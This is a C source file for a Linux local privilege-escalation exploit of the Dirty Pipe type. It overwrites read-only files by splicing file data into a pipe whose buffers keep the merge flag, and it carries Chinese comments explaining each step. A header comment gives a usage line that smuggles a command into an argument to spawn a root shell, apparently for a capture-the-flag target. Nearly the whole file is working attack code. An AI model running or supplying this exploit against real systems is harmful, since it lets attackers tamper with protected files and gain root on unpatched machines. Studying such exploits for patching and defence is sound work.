// gcc -masm=intel -static exploit.c -o exploit
// home/ultra_vires/exploit info 1 'cho "1";setsid cttyhack setuidgid 0 sh;echo "2'

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>


void err_exit(char *msg)
{
    printf("\033[31m\033[1m[-] %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void note_info(char *msg)
{
    printf("\033[34m\033[1m[*] %s\033[0m\n", msg);
}

void good_info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\033[0m\n", msg);
}


static void prepare_pipe(int pipe_fd[2])
{
	if (pipe(pipe_fd)) abort();

	// 分配 16 个 pipe_buffer
	const unsigned pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
	unsigned write_size, read_size;
	char* buffer = (char*) malloc(PAGE_SIZE);

	// 将管道完全填满，每个 pipe_buffer 现在都将具有 PIPE_BUF_FLAG_CAN_MERGE 标志
	for (int i = pipe_size; i > 0; )
	{
		if (i > PAGE_SIZE)
			write_size = PAGE_SIZE;
		else
	    	write_size = i;
		i -= write(pipe_fd[1], buffer, write_size);	// 数据写入管道
	}

	// 排空管道，释放所有 pipe_buffer 实例（但是保留已初始化的标志）
	for (int i = pipe_size; i > 0; )
	{
		if(i > PAGE_SIZE)
	    	read_size = PAGE_SIZE ;
		else
	   		read_size = i;
		i -= read(pipe_fd[0], buffer, read_size);	// 从管道读取数据
	}
	// 管道现在是空的，如果添加新的 pipe_buffer 而不初始化其 flags，即缓冲区将可合并
}

int main(int argc, char **argv)
{
	if (argc != 4) {
		fprintf(stderr, "\033[31m\033[1m[-] Usage: %s TARGETFILE OFFSET DATA!\033[0m\n", argv[0]);
		return EXIT_FAILURE;
	}

	/* dumb command-line argument parser */
	const char *const path = argv[1];
	loff_t offset = strtoul(argv[2], NULL, 0);
	const char *const data = argv[3];
	// 要写入文件的数据长度
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0)
		err_exit("Sorry, cannot start writing at a page boundary!");

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page)
		err_exit("Sorry, cannot write across a page boundary!");

	// 打开输入文件并验证指定的偏移
	const int fd = open(path, O_RDONLY); // yes, ! :-)
	if (fd < 0)
		err_exit("Open failed!");

	struct stat st;
	if (fstat(fd, &st))
		err_exit("Stat failed!");

	if (offset > st.st_size)
		err_exit("Offset is not inside the file!");

	if (end_offset > st.st_size)
		err_exit("Sorry, cannot enlarge the file!");

	// 使用 pipe_BUF_FLAG_CAN_MERGE 初始化的所有标志创建管道
	int pipe_fd[2];
	note_info("Initialize pipe...");
	prepare_pipe(pipe_fd);

	// 将指定偏移量之前的一个字节拼接到管这将添加对页面缓存的引用，
	// 但是由于 copy_page_to_inter_pipe() 不会初始化
	// flags，PIPE_BUF_FLAG_CAN_MERGE 仍设置
	--offset;
	note_info("Splice system call...");
	ssize_t nbytes = splice(fd, &offset, pipe_fd[1], NULL, 1, 0);
	if (nbytes < 0)
		err_exit("Splice failed!");

	if (nbytes == 0)
		err_exit("Short splice!");

	// 以下写入操作不会创建新的 pipe_buffer，但是将改为写入页面缓存，因为 PIPE_BUF_FLAG_CAN_MERGE 标志
	note_info("Pipe data writing file...");
	nbytes = write(pipe_fd[1], data, data_size);
	if (nbytes < 0)
		err_exit("Write failed!");

	if ((size_t)nbytes < data_size)
		err_exit("Short write!");

	good_info("Successfully written.");

	return EXIT_SUCCESS;
}
